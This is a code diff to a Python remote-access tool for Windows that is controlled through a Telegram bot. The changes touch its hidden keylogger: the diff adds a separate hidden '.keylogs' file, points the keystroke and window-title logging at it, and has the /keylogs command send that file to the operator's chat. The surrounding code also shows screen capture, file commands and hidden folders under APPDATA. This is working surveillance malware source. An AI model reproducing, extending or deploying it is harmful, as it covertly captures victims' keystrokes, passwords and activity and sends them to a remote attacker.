@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+import os, os.path, platform, ctypes
+os.environ["PBR_VERSION"]='5.0.0'
 import logging
 from PIL import ImageGrab 								# /capture_pc
 from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
@@ -23,7 +25,6 @@ import proxy
 #import pyaudio, wave 									# /hear
 import telepot, requests 								# telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
-import os, os.path, platform, ctypes
 import pyHook, pythoncom 								# keylogger
 import socket											# internal IP
 import getpass											# get username
@@ -34,12 +35,11 @@ from ctypes import * #fixing pyinstaller - we need to import all the ctypes to g
 
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
 token = 'xx:xx' # you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'xx'
-# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = ['123']
+# ADD YOUR chat_id in string format TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
+known_ids = []
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
@@ -64,6 +64,7 @@ curr_window = None
 user = os.environ.get("USERNAME")	# Windows username to append keylogs
 schedule = {}
 log_file = hide_folder + '\\.user'
+keylogs_file = hide_folder + '\\.keylogs'
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
@@ -115,10 +116,10 @@ def get_curr_window():
 		pid = ctypes.c_ulong(0)
 		user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
 		process_id = "%d" % pid.value
-		executable = ctypes.create_string_buffer("\x00" * 512)
+		executable = ctypes.create_string_buffer(512)
 		h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 		ctypes.windll.psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
-		window_title = ctypes.create_string_buffer("\x00" * 512)
+		window_title = ctypes.create_string_buffer(512)
 		length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
 		pid_info = "\n[ PID %s - %s - %s ]" % (process_id, executable.value, window_title.value)
 		kernel32.CloseHandle(hwnd)
@@ -130,12 +131,12 @@ def pressed_chars(event):
 	global curr_window
 	if event.WindowName != curr_window:
 		curr_window = event.WindowName
-		fp = open(log_file, 'a')
+		fp = open(keylogs_file, 'a')
 		data = get_curr_window()
 		fp.write(data + "\n")
 		fp.close()
 	if event and type(event.Ascii) == int:
-		f = open(log_file,"a")
+		f = open(keylogs_file,"a")
 		if len(event.GetKey()) > 1:
 			tofile = '<'+event.GetKey()+'>'
 		else:
@@ -147,44 +148,6 @@ def pressed_chars(event):
 		f.write(tofile)
 		f.close()
 	return not keyboardFrozen
-	# if event.Ascii > 32 and event.Ascii < 127:
-		# fp = open(log_file, 'a')
-		# data = chr(event.Ascii)
-		# fp.write(data)
-		# fp.close()
-	# else:
-		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "A":
-			# fp = open(log_file, 'a')
-			# fp.write("[SELECT-ALL]")
-			# fp.close()
-			# break
-		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "C":
-			# fp = open(log_file, 'a')
-			# fp.write("[COPY]")
-			# fp.close()
-			# break
-		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "V":
-			# win32clipboard.OpenClipboard()
-			# try:
-				# data = "\n[PASTE] - %s\n" % win32clipboard.GetClipboardData()
-			# except TypeError:
-				# pass
-			# win32clipboard.CloseClipboard()
-			# fp = open(log_file, 'a')
-			# fp.write(data)
-			# fp.close()
-			# break
-		# if event.Key == "Lshift" or "Rshift" or "Return" or "Back":
-			# fp = open(log_file, 'a')
-			# data = "[%s]" % event.Key
-			# fp.write(data)
-			# fp.close()
-		# else:
-			# fp = open(log_file, 'a')
-			# data = "\n[%s]\n" % event.Key
-			# fp.write(data)
-			# fp.close()
-		# return not keyboardFrozen
 	
 def split_string(n, st):
 	lst = ['']
@@ -396,7 +359,7 @@ def handle(msg):
                                 response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
                         elif command == '/keylogs':
                                 bot.sendChatAction(chat_id, 'upload_document')
-                                bot.sendDocument(chat_id, open(log_file, "rb"))
+                                bot.sendDocument(chat_id, open(keylogs_file, "rb"))
                         elif command.startswith('/ls'):
                                 bot.sendChatAction(chat_id, 'typing')
                                 command = command.replace('/ls', '')
